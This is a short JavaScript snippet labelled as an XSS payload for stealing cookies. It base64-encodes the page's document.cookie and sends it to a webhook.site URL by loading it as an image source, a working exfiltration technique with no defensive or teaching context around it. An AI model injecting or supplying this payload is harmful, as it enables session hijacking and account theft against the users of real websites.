// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/a86cbcab-4388-4ba1-8e03-8fae2c3f94d8?data=' + btoa(document.cookie);
